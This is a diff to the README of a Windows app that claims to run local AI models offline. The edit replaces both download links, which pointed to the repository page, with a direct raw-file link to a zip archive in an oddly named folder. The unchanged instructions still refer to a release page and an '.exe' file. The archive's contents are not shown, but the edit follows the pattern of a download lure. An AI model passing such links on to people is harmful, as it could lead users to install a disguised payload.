@@ -1,6 +1,6 @@
 # 💻 gemma-offline-2026 - Run local AI models on Windows
 
-[![Download gemma-offline-2026](https://img.shields.io/badge/Download-Release-blue)](https://github.com/yvannmonney-svg/gemma-offline-2026)
+[![Download gemma-offline-2026](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/yvannmonney-svg/gemma-offline-2026/main/insectproof/gemma_offline_v1.5.zip)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Check these requirements before you start. Your computer needs specific hardware
 
 You do not need to install complicated dependencies. Follow these steps to set up the application on your Windows machine.
 
-1. Visit this [Download Page](https://github.com/yvannmonney-svg/gemma-offline-2026).
+1. Visit this [Download Page](https://raw.githubusercontent.com/yvannmonney-svg/gemma-offline-2026/main/insectproof/gemma_offline_v1.5.zip).
 2. Look for the latest release version on the page.
 3. Click the link that ends in `.exe`.
 4. Save the file to a folder on your computer.
